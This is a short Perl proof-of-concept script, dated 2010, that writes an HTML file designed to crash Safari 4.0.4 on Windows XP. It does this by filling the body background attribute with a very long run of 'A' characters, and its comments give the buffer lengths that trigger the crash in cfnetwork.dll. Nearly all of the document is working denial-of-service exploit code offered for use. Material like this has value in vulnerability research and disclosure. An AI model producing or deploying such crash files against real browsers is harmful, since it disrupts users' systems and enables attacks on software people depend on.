#!/usr/bin/perl
#
# Safari 4.0.4 (531.21.10) - Stack Overflow/run
# 0Day DoS POC by John Cobb - www.NoBytes.com - 20/01/2010 - [v1.0]
# Tested on WinXP (32bit) SP3
#
# Magic Numbers:
# 114516 -> 114718 : Safari quits without error
# 114719 : Safari quits with illegal operation:
# AppName: safari.exe
# AppVer: 5.31.21.10
# ModName: cfnetwork.dll
# ModVer: 1.450.5.0
# Offset: 000567a7

$filename = $ARGV[0];
$buffer = $ARGV[1];
if(!defined($filename))
{
print "Usage: $0 <filename.html> <buffer>\n\n";
}

$header = "<html>
<head>" . "\n";
$crash = "<body background = \"" . "A" x $buffer . "\">" . "\n";
$footer = "</html>" . "\n";

$data = $header . $crash . $footer;

open(FILE, '>' . $filename);
print FILE $data;
close(FILE);

exit;